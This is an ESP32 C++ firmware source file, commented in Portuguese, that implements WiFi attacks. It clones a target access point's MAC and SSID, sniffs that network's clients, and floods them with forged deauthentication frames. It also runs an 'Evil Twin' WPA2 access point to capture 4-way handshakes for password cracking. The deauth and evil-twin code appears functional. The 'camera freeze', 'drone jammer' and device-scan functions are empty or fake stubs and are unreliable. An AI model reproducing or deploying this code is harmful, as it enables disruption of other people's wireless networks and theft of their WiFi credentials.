// ============================================================
// wifi_attacks.cpp - v4.1 Handshake Edition
// Evil Twin com AP WPA2 + captura de 4-way handshake
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// BSSID CLONE
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

// ============================================================
// CLIENT DISCOVERY
// ============================================================
#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;
    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
            case 0x02:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;
    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5]);
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    promiscuousActive = true;
    Serial.println("[Promisc] Started");
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
    Serial.println("[Promisc] Stopped");
}

// ============================================================
// RAW FRAME HELPERS
// ============================================================
static uint16_t deauthSeqNum = 0;

static bool raw_tx(const uint8_t* frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
        return true;
    }
    return false;
}

static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xC0;
    frame[1] = 0x00;
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    frame[24] = reason;
    frame[25] = 0x00;
}

// ============================================================
// DEAUTH BURST
// ============================================================
static void deauthBurst() {
    uint8_t frame[32];
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Deauth unicast para cada cliente
    for (int i = 0; i < clientCount; i++) {
        buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
        raw_tx(frame, 26);
        delay(1);
    }
    // Broadcast deauth
    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
    raw_tx(frame, 26);
}

// ============================================================
// HELPERS
// ============================================================
static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    // Keep AP active for Termux controller connection!
    if (WiFi.getMode() == WIFI_AP) {
        WiFi.mode(WIFI_AP_STA);
        delay(100);
    }
    // Async scan to prevent watchdog
    WiFi.scanNetworks(true, true);
    int16_t n = 0;
    unsigned long start = millis();
    while ((n = WiFi.scanComplete()) == WIFI_SCAN_RUNNING) {
        yield();
        delay(10);
        if (millis() - start > 10000) break;
    }
    Serial.printf("[WiFi] Scan found %d networks\n", n);
    if (n > 0) {
        for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
            strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
            scannedNetworks[i].ssid[32] = '\0';
            memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
            scannedNetworks[i].rssi = WiFi.RSSI(i);
            scannedNetworks[i].channel = WiFi.channel(i);
            scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
            networkCount++;
        }
        WiFi.scanDelete();
    }
}

uint8_t getNetworkCount() { return networkCount; }
NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }
    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    WiFi.mode(WIFI_AP);
    delay(300);

    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
    if (apMacErr != ESP_OK) {
        Serial.println("[Clone] MAC set failed, aborting");
        return;
    }
    delay(200);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");

    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        bssidCloneActive = true;
        cloneStartTime = millis();
        cloneHealthCheckFailures = 0;
        Serial.printf("[Clone] BSSID CLONE ACTIVE on CH%d IP:192.168.4.1\n", cloneChannel);
    } else {
        Serial.println("[Clone] FAILED");
    }
}

static void restartBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Restarting...");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);
    WiFi.mode(WIFI_AP);
    delay(200);
    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(100);
    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        cloneHealthCheckFailures = 0;
        Serial.println("[Clone] Restarted OK");
    } else {
        cloneHealthCheckFailures++;
        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
    }
}

static 
void restoreCrazyCatAP() {
    WiFi.mode(WIFI_AP_STA);
    delay(200);
    WiFi.softAPConfig(
        IPAddress(192, 168, 4, 1),
        IPAddress(192, 168, 4, 1),
        IPAddress(255, 255, 255, 0)
    );
    delay(100);
    WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
    delay(200);
    Serial.println("[WiFi] CrazyCat AP restored");
}

void stopBssidClone() {
    if (!bssidCloneActive && !isSoftAPActive()) return;
    Serial.println("[Clone] Stopping...");
    stopPromiscuous();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);
    WiFi.mode(WIFI_AP);
    delay(200);
    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(100);
    restoreCrazyCatAP();
    bssidCloneActive = false;
    Serial.println("[Clone] Stopped, MAC restored, CrazyCat AP active");
}

// ============================================================
// DEAUTH
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;
    startBssidClone(networkIndex);
    startPromiscuous();
    deauthActive = true;
    Serial.println("[Deauth] STARTED");
}

void stopDeauth() {
    if (!deauthActive) return;
    Serial.println("[Deauth] STOPPED");
    Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
        (millis() - cloneStartTime) / 1000, deauthPacketCount);
    deauthActive = false;
    stopPromiscuous();
    stopBssidClone();
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// DEAUTH LOOP
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;
    deauthBurst();

    static unsigned long lastHealthCheck = 0;
    if (millis() - lastHealthCheck > 3000) {
        lastHealthCheck = millis();
        if (!isSoftAPActive()) {
            cloneHealthCheckFailures++;
            Serial.printf("[Clone] AP lost! Failure %d/5\n", cloneHealthCheckFailures);
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
                startPromiscuous();
            } else {
                Serial.println("[Clone] Too many failures, stopping");
                stopDeauth();
                return false;
            }
        } else {
            esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
            cloneHealthCheckFailures = 0;
            int clients = WiFi.softAPgetStationNum();
            Serial.printf("[Clone] %d on clone | %d target clients | CH%d | Pkts:%lu\n",
                clients, clientCount, cloneChannel, deauthPacketCount);
        }
    }
    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
    restoreCrazyCatAP();
}

bool isFakeAPActive() { return fakeAPEnabled; }

// ============================================================
// EVIL TWIN WPA2 + HANDSHAKE CAPTURE
// ============================================================
void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    stopDeauth();
    stopHandshakeCapture();

    fakeAPEnabled = true;
    passwordCaptured = false;
    evilTwinActive = true;

    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    WiFi.mode(WIFI_AP);
    delay(300);

    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    if (macErr != ESP_OK) {
        Serial.printf("[EvilTwin] MAC set failed: %d\n", macErr);
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }
    delay(200);

    // Cria AP WPA2 com senha falsa (para forcar handshake)
    // A senha nao importa — o cliente vai tentar conectar e falhar,
    // mas o handshake M1/M2 sera capturado
    bool apOk = WiFi.softAP(cloneSSID, "password123", cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);

    if (!apOk) {
        Serial.println("[EvilTwin] softAP failed");
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

    bssidCloneActive = true;
    deauthActive = true;
    cloneStartTime = millis();
    cloneHealthCheckFailures = 0;

    // Inicia captura de handshake
    startHandshakeCapture();

    Serial.printf("[EvilTwin] ACTIVE: %s CH%d WPA2 | Handshake capture ON\n", cloneSSID, cloneChannel);
}

void stopEvilTwin() {
    deauthActive = false;
    evilTwinActive = false;
    fakeAPEnabled = false;
    passwordCaptured = false;
    stopHandshakeCapture();
    stopBssidClone();
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    Serial.println("[EvilTwin] STOPPED");
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }
RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
